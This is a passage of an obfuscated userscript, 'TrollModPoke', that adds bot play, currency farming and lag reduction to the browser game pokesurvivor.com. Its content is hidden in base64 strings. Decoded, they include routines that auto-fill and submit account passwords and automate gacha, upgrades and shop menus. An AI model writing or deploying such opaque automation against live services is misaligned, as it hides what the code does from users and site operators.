// ==UserScript==
// @name         TrollModPoke (kết nối app)
// @namespace    com.tungtom.app
// @version      2.1.0
// @description  Bot + giảm lag cho pokesurvivor.com, kết nối với menu nổi của app TrollModPoke
// @match        https://pokesurvivor.com/*
// @match        https://www.pokesurvivor.com/*
// @match        https://pokesurvivor.doofcraft.com/*
// @run-at       document-start
// @grant        none
// @inject-into  page
// ==/UserScript==

const _0xarr=["c3R5bGU=","W2RhdGEtcHNib3QtZG9ja117ZGlzcGxheTpub25lIWltcG9ydGFudH0=","ZnVsbA==","cGFnZQ==","W2RhdGEtcHNib3QtdWldLFtkYXRhLXR0LW1pbmld","bm9uZQ==","aGlkZGVu","MA==","Q0FOVkFT","Y3Y=","dHJhbnNwYXJlbnQ=","bm9uZQ==","SU1H","VklERU8=","U1ZH","c3Zn","bWVkaWE=","SU5QVVQ=","U0VMRUNU","VEVYVEFSRUE=","QlVUVE9O","Ym94","SU5QVVQ=","U0VMRUNU","VEVYVEFSRUE=","Izg4OQ==","IA==","SU5QVVQ=","VEVYVEFSRUE=","dHh0","QlVUVE9O","Y2VudGVy","Z2FtZQ==","Y2FudmFzLnBzLWNhbnZhcw==","Y2FudmFzOm5vdChbZGF0YS1wc2JvdC11aV0p","Y2FudmFz","ZGF0YS1wc2JvdC11aQ==","MmQ=","IzAwMA==","cmdiYSgwLCAwLCAwLCAwKQ==","IzBiMGYxNA==","c2ltcGxl","Y2FudmFz","Y3Y=","dHh0","bWVkaWE=","IzVhNjU3Nw==","IzlhYTdiYQ==","c2ltcGxl","c2ltcGxl","aW1hZ2UvcG5n","aW1hZ2UvanBlZw==","dG91Y2g=","cG9pbnRlcm1vdmU=","dG91Y2hlbmQ=","dG91Y2hjYW5jZWw=","ZG93bg==","cG9pbnRlcmRvd24=","dG91Y2hzdGFydA==","bW92ZQ==","cG9pbnRlcm1vdmU=","dG91Y2htb3Zl","Y2FuY2Vs","cG9pbnRlcmNhbmNlbA==","cG9pbnRlcnVw","dG91Y2hjYW5jZWw=","dG91Y2hlbmQ=","bW91c2Vtb3Zl","bW91c2Vkb3du","bW91c2V1cA==","Y2xpY2s=","aGlkZGVu","bm9uZQ==","MA==","VEVYVEFSRUE=","dmFsdWU=","aW5wdXQ=","Y2hhbmdl","TkZE","ZA==","aW5wdXQ=","cGFzc3dvcmQ=","IA==","IA==","IA==","YXJpYS1sYWJlbA==","IA==","YnV0dG9uLGlucHV0W3R5cGU9c3VibWl0XSxpbnB1dFt0eXBlPWJ1dHRvbl0sW3JvbGU9YnV0dG9uXQ==","c3VibWl0","a2V5ZG93bg==","a2V5cHJlc3M=","a2V5dXA=","RW50ZXI=","RW50ZXI=","YnV0dG9uLGEsW3JvbGU9YnV0dG9uXQ==","xJBhbmcgdMOsbSDDtCDEkcSDbmcgbmjhuq1w4oCm","xJDDoyDEkWnhu4FuIHTDoGkga2hv4bqjbiArIG3huq10IGto4bqpdSB2w6AgZ+G7rWkgxJHEg25nIG5o4bqtcA==","xJDDoyDEkWnhu4FuIG3huq10IGto4bqpdSAoa2jDtG5nIHRo4bqleSDDtCB0w6BpIGtob+G6o24pIHbDoCBn4butaSDEkcSDbmcgbmjhuq1w","xJDDoyDEkWnhu4FuIG5oxrBuZyBraMO0bmcgYuG6pW0gxJHGsOG7o2MgbsO6dCDEkcSDbmcgbmjhuq1w","TOG7l2kga2hpIMSRaeG7gW4gZm9ybTog","S2jDtG5nIHRo4bqleSDDtCBt4bqtdCBraOG6qXUgdHLDqm4gdHJhbmcgKG7hur91IGdhbWUgY2jhu4kgY8OzIMSRxINuZyBuaOG6rXAgYuG6sW5nIEdvb2dsZSB0aMOsIHTDrW5oIG7Eg25nIG7DoHkga2jDtG5nIGTDuW5nIMSRxrDhu6NjKQ==","YnV0dG9uLFtyb2xlPWJ1dHRvbl0sYSxbZGF0YS1nb10sW2RhdGEtdGFiXSxbZGF0YS1nZW5dLC50YWIsLmJ0bixzdW1tYXJ5LGxhYmVs","YXJpYS1sYWJlbA==","IA==","ZGF0YS1nbw==","ZGF0YS10YWI=","ZGF0YS1nZW4=","ZGF0YS1nYWNoYQ==","IA==","W2RhdGEtcHNib3QtdWldLFtkYXRhLXBzYm90LWRvY2td","YXJpYS1kaXNhYmxlZA==","dHJ1ZQ==","bmVhcmVzdA==","cG9pbnRlcmRvd24=","bW91c2Vkb3du","cG9pbnRlcnVw","bW91c2V1cA==","ZGF0YS1nbw==","aQ==","aWk=","aWlp","aXY=","dg==","dmk=","dmlp","dmlpaQ==","aXg=","a2FudG8=","am9odG8=","aG9lbm4=","c2lubm9o","dW5vdmF8dGVzZWxpYXx1bm92YQ==","a2Fsb3M=","YWxvbGE=","Z2FsYXI=","cGFsZGVh","ZGF0YS1nZW4=","XmdlbihlcmF0aW9ufGVyYWNpb24pP1tccy46Iy1dKig=","fA==","KSQ=","Xig=","KVxi","ZGF0YS1nbw==","I3Njci1tZW51","IA==","IA==","Lm1vZGFsLFtyb2xlPWRpYWxvZ10sZGlhbG9nLC5wb3B1cCwub3ZlcmxheSxbaWQqPXBvcHVwXSxbaWQqPXJlc3VsdF0sW2NsYXNzKj1wb3B1cF0sW2NsYXNzKj1yZXN1bHRd","YnVzeQ==","xJBhbmcgbeG7nyBnYWNoYeKApg==","Z2FjaGE=","S2jDtG5nIHRo4bqleSBuw7p0IEdhY2hhIHRyb25nIG1lbnUgZ2FtZSAodsOgbyBtZW51IGNow61uaCBy4buTaSB0aOG7rSBs4bqhaSwgaG/hurdjIGLhuqVtICJEw7IgZ2lhbyBkaeG7h24iKQ==","xJDDoyBjaOG7jW4gR2VuIA==","TcOgbiBnYWNoYSBj4bunYSBnYW1lIGtow7RuZyBjw7MgYuG7mSBjaOG7jW4gR2VuIA==","IOKAlCBxdWF5IGLhuqNuIGhp4buHbiB04bqhaQ==","S2jDtG5nIHRo4bqleSBuw7p0IHF1YXkgKMSRw6MgcXVheSA=","IGzhuqduKQ==","S2jDtG5nIHF1YXkgxJHGsOG7o2MgdGnhur9wICho4bq/dCB2w6kveHU/KSDigJQgxJHDoyBxdWF5IA==","IGzhuqdu","xJDDoyBxdWF5IA==","Lw==","WG9uZzogxJHDoyBxdWF5IA==","IGzhuqdu","IChHZW4g","KQ==","TOG7l2kgZ2FjaGE6IA==","c3RhcnRlZA==","YnVzeQ==","xJBhbmcgbeG7nyBVcGdyYWRl4oCm","dXBncmFkZQ==","S2jDtG5nIHRo4bqleSBt4bulYyBVcGdyYWRlIHRyb25nIG1lbnUgZ2FtZSAoYuG6pW0gIkTDsiBnaWFvIGRp4buHbiIgcuG7k2kgZ+G7rWkgbOG6oWkgY2hvIG3DrG5oKQ==","VXBncmFkZTogxJHDoyBj4buZbmcg","IGzhuqdu","VXBncmFkZToga2jDtG5nIGPDsyDEkWnhu4NtIG7DoG8gYuG6pW0gxJHGsOG7o2M=","TOG7l2kgdXBncmFkZTog","c3RhcnRlZA==","c2hvcA==","xJDDoyBt4bufIHNob3AgY+G7p2EgZ2FtZQ==","S2jDtG5nIHRo4bqleSBuw7p0IFNob3AgdHJvbmcgbWVudSBnYW1lICh2w6BvIG1lbnUgY2jDrW5oIHLhu5NpIHRo4butIGzhuqFpKQ==","W2lkXj1zY3ItXSxkaWFsb2csW3JvbGU9ZGlhbG9nXSwubW9kYWwsLm92ZXJsYXksLnBvcHVw","aGlkZGVu","VVJMOiA=","TcOgbiDEkWFuZyBt4bufOiA=","LCA=","KGtow7RuZyB0aOG6pXkp","YXJpYS1sYWJlbA==","IA==","Iw==","ZGF0YS1nbw==","W2dvPQ==","ZGF0YS1nbw==","XQ==","ZGF0YS1nZW4=","W2dlbj0=","ZGF0YS1nZW4=","XQ==","ICh04bqvdCk=","ICI=","Ig==","Cg==","c2NyLXNhdmVub3Rl","c2F2ZW5vdGUtb2s=","c2NyLW5ld3M=","bmV3cy1jbG9zZQ==","c2NyLW5pY2s=","bmljay1sYXRlcg==","c2NyLXJlY292ZXI=","cmVjLWxhdGVy","c2NyLXZpZGVv","dmlkZW8tY2xvc2U=","aGlkZGVu","c2NyLW92ZXI=","c2NyLW1lbnU=","R2nDoW0gc8OhdDogxJHDs25nIHBvcHVwIA==","YnRuLXNhdmU=","aGlkZGVu","R2nDoW0gc8OhdDogYuG6pW0gTMawdSBnYW1l","YnRuLWFnYWlu","I3Njci1tZW51IFtkYXRhLWdvPXBsYXld","R2nDoW0gc8OhdDogY2jGoWkgdsOhbiB0aeG6v3A=","c3RhcnRlZA==","c2tpcA==","c3RhcnRlZA==","RE9NQ29udGVudExvYWRlZA==","MS4xMC4w","ZG9vZmNyYWZ0","ZGVmYXVsdA==","Y29yZS9saXRlLmpz","c2l0ZXMvZGVmYXVsdC9ob29rLmpz","c2l0ZXMvZGVmYXVsdC9zaXRlLmpz","c2l0ZXMvZGVmYXVsdC9waWxvdC5qcw==","c2l0ZXMvZGVmYXVsdC9kYXRhLmpz","Y29yZS9tb3Zlcy5qcw==","Y29yZS9ib3QuanM=","Y29yZS9mYXJtTW9uZXkuanM=","Y29yZS9saXRlLmpz","c2l0ZXMvZG9vZmNyYWZ0L3NpdGUuanM=","c2l0ZXMvZG9vZmNyYWZ0L2RhdGEuanM=","Y29yZS9ib3QuanM=","Y29yZS9mYXJtTW9uZXkuanM=","cHNib3Qtc3RhdHVz","ZGl2","cHNib3Qtc3RhdHVz","cG9zaXRpb246Zml4ZWQ7bGVmdDo0cHg7dG9wOjRweDt6LWluZGV4OjIxNDc0ODM2NDc7bWF4LXdpZHRoOjk0dnc7bWF4LWhlaWdodDo0NHZoO292ZXJmbG93OmF1dG87d2hpdGUtc3BhY2U6cHJlLXdyYXA7Zm9udDoxMnB4IG1vbm9zcGFjZTtiYWNrZ3JvdW5kOiMwMDBjO2NvbG9yOiM2Y2Y7cGFkZGluZzozcHggNnB4O2JvcmRlci1yYWRpdXM6NHB4O3BvaW50ZXItZXZlbnRzOm5vbmU=","cHNib3QubGl0ZQ==","e30=","ZGV2aWNlUGl4ZWxSYXRpbw==","ZGV2aWNlUGl4ZWxSYXRpbw==","c2hhZG93Qmx1cg==","c2hhZG93Q29sb3I=","cmdiYSgwLDAsMCwwKQ==","ZmlsdGVy","bm9uZQ==","aW1hZ2VTbW9vdGhpbmdFbmFibGVk","aW1hZ2VTbW9vdGhpbmdRdWFsaXR5","bG93","IzE2MjIxYg==","c291cmNlLW92ZXI=","bGlnaHRlcg==","ZHJhd0ltYWdl","ZmlsbFRleHQ=","c3Ryb2tlVGV4dA==","ZmlsbFJlY3Q=","ZHJhd0ltYWdl","ZHJhd0ltYWdl","ZmlsbFJlY3Q=","Y2xlYXJSZWN0","c3Ryb2tlUmVjdA==","ZmlsbA==","c3Ryb2tl","ZmlsbFRleHQ=","c3Ryb2tlVGV4dA==","ZnVuY3Rpb24=","Y2FudmFzOm5vdChbZGF0YS1wc2JvdC11aV0pIHsgaW1hZ2UtcmVuZGVyaW5nOiBwaXhlbGF0ZWQgIWltcG9ydGFudDsgaW1hZ2UtcmVuZGVyaW5nOiBjcmlzcC1lZGdlcyAhaW1wb3J0YW50OyB9","RE9NQ29udGVudExvYWRlZA==","c3R5bGU=","cHNib3QtbGl0ZS1jc3M=","cHNib3QtbGl0ZS1weA==","ZHBy","cmVzaXpl","R2FtZQ==","R2FtZQ==","TElGVA==","R2FtZQ==","R2FtZQ==","bG9hZA==","cHNib3QuZGV2","MQ==","L2Rldi5odG1s","Lw==","c3VibWl0U29sbw==","c3VibWl0R3JvdXA=","ZnVuY3Rpb24=","JWNbUFNCb3Rd","Y29sb3I6IzdjZg==","dsOhbiBkbyBib3QgY2jGoWk6IGtow7RuZyBn4butaSBi4bqjbmcgeOG6v3AgaOG6oW5n","c3RyaW5n","ZGl2LmtleQ==","Kg==","I2x2bC1yci1u","Kg==","IA==","W2NsYXNzXQ==","IA==","LmZpdC1sb3c=","LmZpdC1oaWdo","aGVhbA==","bWFnbmV0","Ym9tYg==","Y29pbg==","dGlja2V0","dGlja2V0MTA=","aXRlbQ==","c3BoZXJl","dGhpZWY=","Rzp0aGllZg==","RzpzaGlueQ==","em9uZQ==","cG9seQ==","RzpzaG90","bGluZQ==","eHA=","eHBCaWc=","YmlnY2hlc3Q=","dHJlZQ==","cm9jaw==","Y2hlc3Q=","YmlnY2hlc3Q=","YWx0YXI=","c3ByaW5n","dHJhcA==","RzpyaWZ0","bGF2YQ==","cG9pc29u","c3Bhcms=","IzNlN2EzOSAjNDQ4MTNkICMzOTcxMzQgIzdkNjc0MiAjNzM1ZTNiICM4NjcwNGE=","IzVkNmU0OSAjNjc3YTUwICM1NjY1NDQgIzg4YTA2ZSAjMjYzMDFmICMzZTQ5MzQgIzM2M2YyZCAjMjMyYTFk","IzNiN2ZjNiAjMmM2NGE2ICNiM2RlZmE=","d2F0ZXI=","IzRkNTc3OCAjNTM1ZTgxICM0NzUwNmYgIzNjNDQ2MiAjNDI0YTY5ICMzNzQwNWI=","IzVmNTA4OSAjNjk1OTk2ICM1NjQ5N2QgI2EwOGRkYyAjMWYxOTM0ICMzZjM0NjMgIzM4MmU1OSAjMjIxYzNh","IzJhOWNhYiAjMWQ3YzhhICNhYWY0Zjc=","d2F0ZXI=","IzViNDUzNyAjNjQ0YzNjICM1MzNmMzIgIzQwMzUzMCAjNDczYjM0ICMzOTJmMmI=","IzNjMzYzNCAjNDQzZDNhICMzNTMwMmUgIzYyNTc1MiAjMTQxMTEwICMyYjI2MjQgIzI1MjAxZiAjMTUxMjEx","I2U0NWExZiAjYjk0MDFhICNmZmQ0NmE=","bGF2YQ==","IzJmM2EyNiAjMzQ0MDJhICMyYTMzMjIgIzRhM2EyYSAjNDIzNDI2ICM1MTQwMmU=","IzNkMzQ0NiAjNDUzOTRmICMzNjJlM2UgIzZhNWE3YSAjMTQwZjE4ICMyYTIzMzAgIzI0MWUyYSAjMTMwZjE2","IzNlNWEyYSAjMmM0MjIwICM5YWMyNWE=","c3dhbXA=","IzM0MzAzZiAjMzkzNDQ2ICMyZjJiMzkgIzJhMjYzMSAjMjYyMjJjICMyZTJhMzY=","IzRhNDY1MiAjNTI0ZTVjICM0MjNlNDkgIzdhNzY4NCAjMTIxMDE2ICMyZTJiMzQgIzI4MjUyZSAjMTQxMjE3","IzNhM2E2YSAjMmEyYTUyICNhNmE2ZmY=","d2F0ZXI=","IzFmMmEyYSAjMjMzMDMwICMxYjI1MjUgIzJlMjYyMiAjMjkyMjFmICMzMzJhMjU=","IzJlMjgzOCAjMzUyZTQwICMyODIyMzEgIzU4NGM2NiAjMGUwYjEyICMyMTFjMjggIzFjMTgyMyAjMGYwZDEz","IzZhM2E4YSAjNGUyYTZhICNlMGE2ZmY=","cG9pc29u","IA==","IA==","IA==","IzZmOGE0ZiAjOGE3ZjZhICM0ZjhmZDAgLSB3YXRlcnwjNWIzYTJlICMzYTI4MjYgI2U0NWExZiAjZmZkNDZhIGxhdmF8IzNjNmE4MCAjMmE0NjYwICMyZjg2ZDYgI2JmZWFmZiB3YXRlcnw=","IzNhN2EzMiAjNGE2YTM2ICM0ZjZiMmEgIzlhYzI1YSBzd2FtcHwjNGE0ODQwICMzYTNhNDggI2U4YzAyMCAjZmZmNmMwIHNwYXJrfCNiOGNmZTAgIzdmOWZjMCAjOWZkOGYwICNmZmZmZmYgaWNlfA==","IzhhNmE0NiAjNWU0MjMyICM0ZjhmZDAgLSB3YXRlcnwjNDYzODRmICMzMzI2M2YgIzlhNGZjMCAjZTBhNmZmIHBvaXNvbnwjYjA4YTUyICM4YTVlMzQgIzlhN2E0OCAjZDZiOThhIHN3YW1wfA==","IzlmYjhkOCAjZGZlOGY0ICM3ZmI4ZmYgLSB3YXRlcnwjNWU0NDcwICMzZTJhNTUgIzhhNWFkMCAtIHdhdGVyfCM1YTZhMmEgIzVlNGEyNiAjNmE3YTJhICNjNGQ2NWEgc3dhbXB8","IzdhNmE1OCAjNTU0NzNhICM0ZjhmZDAgLSB3YXRlcnwjMzgzNDQ3ICMyNDIwMmUgIzNhM2E2YSAtIHdhdGVyfCMzNjNhNWUgIzI0MjY0YSAjN2I1Y2ZmICNjOWE2ZmYgbGF2YXw=","IzJjMjgyZSAjMWMxODFmICMyYTJhM2EgLSB3YXRlcnwjNmQ3ODg4ICM0NjUwNjAgIzRmOGZkMCAtIHdhdGVyfCM0ZjdmNWEgIzdhNWE4YSAjOGZkOGZmICNmZmUwZjQgd2F0ZXJ8","IzRhNDI0MCAjMmUyODI5ICNlOGE4MmEgI2ZmZjFiOCBsYXZh","fA==","IA==","LQ==","MmQ=","Z2FtZQ==","Y2FudmFzOm5vdChbZGF0YS1wc2JvdC11aV0p","bW92ZQ==","YnVmZg==","c3RhdHVz","c3RhdHVz","cHNib3QubW92ZXMuZGVmYXVsdA==","c2NyLWxldmVsdXA=","bHZsLXJlcm9sbA==","aGlkZGVu","bHZsLXJyLW4=","Og==","Og==","IOKGkiA=","bmV3","bmV3","ZXZv","c3RhdA==","bmV3","YnVmZg==","ZGVmYXVsdA==","TeG6t2MgxJHhu4tuaCDCtyBwb2tlc3Vydml2b3IuY29t","aGF6YXJk","aGF6YXJk","c2hvdA==","aGF6YXJk","aGF6YXJk","aGVhbA==","d2FsbA==","d2FsbA==","d2FsbA==","d2FsbA==","d2FsbA==","ZGFzaDo0LDQvMg==","c3BlY2lhbA==","cGh5c2ljYWw=","bW92ZQ==","YnVmZg==","c3RhdHVz","cHNib3Qubm9yYW5r","MA==","cHNib3Qubm9yYW5r","MQ==","MA==","bHZsLW51bQ==","bHZsLXJyLW4=","ZGl2LmtleQ==","ZGl2LmtleQ==","ZGl2LmtleQ==","bHZsLW51bQ==","YnRuLXNhdmU=","aGlkZGVu","I3VzZXItcGlsbCBpLnN5bmM=","c3luYw==","b2s=","bG9jYWw=","Z3Vlc3Q=","c3luY2luZw==","JWNbUFNCb3Rd","Y29sb3I6IzdjZg==","cGxheWluZw==","W1BTQm90XSBwaWxvdA==","W1BTQm90XSBwaWxvdA==","c2hvd0JvbmQ=","Ym9uZA==","c2hvd0l0ZW1DaG9pY2U=","aXRlbQ==","LQ==","c2NyLWJvbmQ=","bW92ZQ==","YnVmZg==","YWRk","Ym9uZA==","Ym9uZA==","Kw==","xJHhu5MgY+G6p206","I2l0ZW0tY2FyZHMgLmNhcmQ=","aGlkZGVu","c2NyLW92ZXI=","c2NyLW1lbnU=","c2NyLXNhdmVub3Rl","c2F2ZW5vdGUtb2s=","c2NyLW5ld3M=","bmV3cy1jbG9zZQ==","c2NyLW5pY2s=","bmljay1sYXRlcg==","c2NyLXJlY292ZXI=","cmVjLWxhdGVy","c2NyLXZpZGVv","dmlkZW8tY2xvc2U=","YnRuLWFnYWlu","I3Njci1tZW51IFtkYXRhLWdvPXBsYXld","em9uZQ==","dHJhcA==","dGhpZWY=","dGlja2V0MTA=","dGhpZWY=","xJF14buVaSBHaG9sZGVuZ28=","xJF14buVaSBNZW93dGg=","cmlmdA==","dsOgbyByaWZ0","d2FpdA==","bG9zdA==","xJFpIGPhu6l1","ZXNjb3J0","aOG7mSB04buRbmc=","bG9z","LA==","dMOsbSBnw7NjIGLhuq9u","YWx0YXI=","YWx0YXI=","bOG6pXkgYnVmZg==","c3ByaW5n","c3ByaW5n","aOG7kyBo4buTaSBtw6F1","YmlnY2hlc3Q=","Y2hlc3Q=","beG7nyByxrDGoW5n","aGVhbA==","dHJhcA==","aGVhbA==","aGVhbA==","dGlja2V0","aXRlbQ==","bmjhurd0IMSR4buT","bmjhurd0IMSR4buT","dMOsbSBxdcOhaQ==","dGhpZWY=","anVkZ21lbnQ=","dHJhcA==","bG9z","QXJjZXVzOiBuw6k=","QXJjZXVzOiBjaOG6oXkgdsOybmc=","cmlmdDogbsOp","cmlmdDogxJHDoW5oIGJvc3M=","bsOp","a8OpbyBxdcOhaSBjaOG6oXkgdsOybmc=","xJFpIGThuqFv","beG7nyByxrDGoW5n","YuG7jyBt4bulYyB0acOqdQ==","a+G6uXQ6IHRob8OhdCByYQ==","b3JiaXQ=","YnVmZg==","b3JiaXQ=","cGxheWluZw==","Z2nhu68gbW92ZQ==","KEF1dG8gc2tpbGwgdOG6r3Qp","Y2hvaWNlYmFuZA==","dGhpZWY=","Zm9l","YnVmZg==","cXVpY2s=","bHVtaW5vdXM=","ZMO5bmcgb3Ji","cGxheWluZw==","cGF1c2Vk","dmlzaWJsZQ==","dOG7sSBi4buPIHBhdXNl","Og==","Og==","c3RhdA==","I2ZmZDIzZg==","d2F0ZXI=","ZmlyZQ==","cm9jaw==","aWNl","aG9taW5n","YXVyYQ==","b3JiaXQ=","bm92YQ==","cHJvamVjdGlsZQ==","dWk=","b3Zlcg==","Lg==","LA==","TsOqbiBkw7luZzog","IMK3IA==","a2V5ZG93bg==","RXNjYXBl","S2V5UA==","cGxheWluZw==","a2V5ZG93bg==","d2hlZWw=","cG9pbnRlcmRvd24=","aGF6YXJk","aGF6YXJk","eHA=","Z29vZA==","Z29vZA==","Y2FzZQ==","Y2FzZQ==","Z29vZA==","Z29vZA==","c2FmZQ==","aGVhbA==","Z29vZA==","cmlmdA==","cmlmdA==","cmlmdA==","cmlmdA==","Z29vZA==","Z29vZA==","Z29vZA==","d2FsbA==","c2FmZQ==","d2FsbA==","c2FmZQ==","YnVmZg==","eHA=","dGFja2xl","VGFja2xl","bm9ybWFs","bWVsZWU=","cGh5c2ljYWw=","Q2hhcmdlcyBpbiBhbiBhcmMgYXQgZXZlcnl0aGluZyBpbiBmcm9udCBvZiB5b3Uu","Vmlnb3I=","cXVpY2stYXR0YWNr","UXVpY2sgQXR0YWNr","bm9ybWFs","ZGFzaA==","cGh5c2ljYWw=","WW91IGRhc2ggYXQgdGhlIGVuZW15IGxpa2UgbGlnaHRuaW5nIGFuZCBoaXQgZXZlcnl0aGluZyBvbiB0aGUgd2F5Lg==","U3ByaW50","c3dvcmRzLWRhbmNl","U3dvcmRzIERhbmNl","bm9ybWFs","YnVmZg==","c3RhdHVz","cGF0aw==","RGVhbHMgbm8gZGFtYWdlOiBidWlsZHMgKHBoeXNpY2FsKSBBVFRBQ0sgd2hpbGUgYWN0aXZlLg==","bmFzdHktcGxvdA==","TmFzdHkgUGxvdA==","bm9ybWFs","YnVmZg==","c3RhdHVz","c2F0aw==","RGVhbHMgbm8gZGFtYWdlOiBidWlsZHMgU1BFQ0lBTCBBVFRBQ0sgd2hpbGUgYWN0aXZlLg==","YWdpbGl0eQ==","QWdpbGl0eQ==","bm9ybWFs","YnVmZg==","c3RhdHVz","c3Bk","RGVhbHMgbm8gZGFtYWdlOiBidWlsZHMgU1BFRUQgd2hpbGUgYWN0aXZlLg==","aGFyZGVu","SGFyZGVu","bm9ybWFs","YnVmZg==","c3RhdHVz","ZGVm","RGVhbHMgbm8gZGFtYWdlOiBidWlsZHMgREVGRU5TRSB3aGlsZSBhY3RpdmUu","ZW1iZXI=","RW1iZXI=","ZmlyZQ==","cHJvamVjdGlsZQ==","c3BlY2lhbA==","QSBmaXJlYmFsbCBhdCB0aGUgbmVhcmVzdCBlbmVteS4=","UG93ZXI=","ZmxhbWV0aHJvd2Vy","RmxhbWV0aHJvd2Vy","ZmlyZQ==","Y29uZQ==","c3BlY2lhbA==","QSBzaG9ydCBmYW4gb2YgZmxhbWVzIHRoYXQgYnVybnMu","UmVmbGV4ZXM=","ZmlyZS1zcGlu","RmlyZSBTcGlu","ZmlyZQ==","b3JiaXQ=","c3BlY2lhbA==","RmxhbWVzIHRoYXQgc3BpbiBhcm91bmQgeW91LiBDb25zdGFudCBkZWZlbnNlLg==","U3ludGhlc2lz","aGVhdC13YXZl","SGVhdCBXYXZl","ZmlyZQ==","bm92YQ==","c3BlY2lhbA==","RXhwbG9kZXMgaW4gZmxhbWVzIGluIGV2ZXJ5IGRpcmVjdGlvbi4=","Vmlnb3I=","d2F0ZXItZ3Vu","V2F0ZXIgR3Vu","d2F0ZXI=","cHJvamVjdGlsZQ==","c3BlY2lhbA==","QSBwaWVyY2luZyBqZXQuIFJlbGlhYmxlIGF0IGFueSByYW5nZS4=","UG93ZXI=","YnViYmxl","QnViYmxl","d2F0ZXI=","bm92YQ==","c3BlY2lhbA==","QSBmYW4gb2YgYnViYmxlcyB0aGF0IHNsb3dzIHdoYXRldmVyIHRoZXkgdG91Y2gu","U3ByaW50","aHlkcm8tcHVtcA==","SHlkcm8gUHVtcA==","d2F0ZXI=","YmVhbQ==","c3BlY2lhbA==","QSBzbG93IGJ1dCBkZXZhc3RhdGluZyB3YXRlciBibGFzdC4=","UG93ZXI=","YXF1YS1yaW5n","QXF1YSBSaW5n","d2F0ZXI=","YnVmZg==","c3RhdHVz","cmVnZW4=","RGVhbHMgbm8gZGFtYWdlOiBidWlsZHMgaGVhbHRoIFJFR0VORVJBVElPTi4=","dmluZS13aGlw","VmluZSBXaGlw","Z3Jhc3M=","bWVsZWU=","cGh5c2ljYWw=","TG9uZy1yYW5nZSB3aGlwcyBpbiBhIHdpZGUgYXJjLg==","UG93ZXI=","cmF6b3ItbGVhZg==","UmF6b3IgTGVhZg==","Z3Jhc3M=","Ym9vbWVyYW5n","cGh5c2ljYWw=","VHdvIGxlYXZlcyB0aGF0IGZseSBvdXQgYW5kIGJhY2ssIGN1dHRpbmcgYm90aCB3YXlzLg==","UmVmbGV4ZXM=","bGVhZi1zdG9ybQ==","UGV0YWwgQmxpenphcmQ=","Z3Jhc3M=","b3JiaXQ=","c3BlY2lhbA==","QSBjeWNsb25lIG9mIGxlYXZlcyBzcGlucyB3aWRlbHkgYXJvdW5kIHlvdS4=","U3ludGhlc2lz","Z2lnYS1kcmFpbg==","R3Jhc3MgS25vdA==","Z3Jhc3M=","YXVyYQ==","c3BlY2lhbA==","Um9vdHMgdGhhdCBzbmFyZSBhbmQgcG91bmQgZXZlcnl0aGluZyBuZWFyIHlvdS4=","Vmlnb3I=","dGh1bmRlci1zaG9jaw==","VGh1bmRlciBTaG9jaw==","ZWxlY3RyaWM=","cHJvamVjdGlsZQ==","c3BlY2lhbA==","QSBsaWdodG5pbmctZmFzdCBib2x0IHRoYXQgcGllcmNlcyBzZXZlcmFsIGVuZW1pZXMu","UG93ZXI=","ZGlzY2hhcmdl","RGlzY2hhcmdl","ZWxlY3RyaWM=","YXVyYQ==","c3BlY2lhbA==","QSBwZXJtYW5lbnQgZWxlY3RyaWMgZmllbGQgYXJvdW5kIHlvdS4=","QXJtb3I=","dGh1bmRlcmJvbHQ=","VGh1bmRlcmJvbHQ=","ZWxlY3RyaWM=","Y2hhaW4=","c3BlY2lhbA==","QSBib2x0IHRoYXQganVtcHMgZnJvbSBvbmUgZW5lbXkgdG8gdGhlIG5leHQu","UmVmbGV4ZXM=","Y29uZnVzaW9u","Q29uZnVzaW9u","cHN5Y2hpYw==","cHJvamVjdGlsZQ==","c3BlY2lhbA==","QSB3YXZlIHRoYXQgaG9tZXMgaW4gb24gaXRzIHRhcmdldC4=","UmVmbGV4ZXM=","cHN5YmVhbQ==","UHN5YmVhbQ==","cHN5Y2hpYw==","YmVhbQ==","c3BlY2lhbA==","QSB3aWRlLCBoZWF2eS1oaXR0aW5nIHBzeWNoaWMgYmVhbS4=","UG93ZXI=","cHN5Y2hpYw==","UHN5Y2hpYw==","cHN5Y2hpYw==","bm92YQ==","c3BlY2lhbA==","QSByYWRpYWwgbWVudGFsIGJ1cnN0IHRoYXQgc2Vla3MgZW5lbWllcy4=","TWFnbmV0","c2x1ZGdl","U2x1ZGdl","cG9pc29u","cHJvamVjdGlsZQ==","c3BlY2lhbA==","VG94aWMgc2x1ZGdlIHRoYXQgcG9pc29ucyBvbiBpbXBhY3Qu","UG93ZXI=","bXVkLXNob3Q=","TXVkIFNob3Q=","Z3JvdW5k","bm92YQ==","c3BlY2lhbA==","U3BsYXNoZXMgbXVkIGFyb3VuZCBhbmQgc2xvd3MgZm9lcy4=","UG93ZXI=","Z3VzdA==","R3VzdA==","Zmx5aW5n","b3JiaXQ=","c3BlY2lhbA==","V2hpcmx3aW5kcyB0aGF0IGVzY29ydCB5b3Uu","U3ByaW50","d2luZy1hdHRhY2s=","V2luZyBBdHRhY2s=","Zmx5aW5n","bWVsZWU=","cGh5c2ljYWw=","QSB3aWRlIHdpbmcgc3dlZXAgdGhhdCBwdXNoZXMgZm9lcyBiYWNrLg==","UG93ZXI=","Ym9keS1zbGFt","Qm9keSBTbGFt","bm9ybWFs","bWVsZWU=","cGh5c2ljYWw=","QSBmdWxsLXdlaWdodCB0YWNrbGU6IHNsb3csIHNob3J0IGFuZCBicnV0YWwu","UG93ZXI=","aHlwZXItdm9pY2U=","SHlwZXIgVm9pY2U=","bm9ybWFs","bm92YQ==","c3BlY2lhbA==","QSBzb3VuZCB3YXZlIHRoYXQgc3ByZWFkcyBpbiBldmVyeSBkaXJlY3Rpb24u","UmVmbGV4ZXM=","cG9pc29uLXN0aW5n","UG9pc29uIFN0aW5n","cG9pc29u","cHJvamVjdGlsZQ==","cGh5c2ljYWw=","QSBxdWljayBwb2lzb25vdXMgc3Rpbmcu","U3ByaW50","dG94aWM=","VG94aWM=","cG9pc29u","dHJhaWw=","c3BlY2lhbA==","WW91IGxlYXZlIHBvb2xzIG9mIHBvaXNvbiB0aGF0IGJhZGx5IHBvaXNvbiB3aG9ldmVyIHN0ZXBzIG9uIHRoZW0u","U3ludGhlc2lz","YnVsbGRvemU=","QnVsbGRvemU=","Z3JvdW5k","YXVyYQ==","cGh5c2ljYWw=","U2hha2VzIHRoZSBncm91bmQ6IGRhbWFnZXMgYW5kIHNsb3dzIGV2ZXJ5dGhpbmcgbmVhcmJ5Lg==","UG93ZXI=","YnVnLWJpdGU=","QnVnIEJpdGU=","YnVn","bWVsZWU=","cGh5c2ljYWw=","QSBxdWljayBiaXRlIGluIGEgc2hvcnQgYX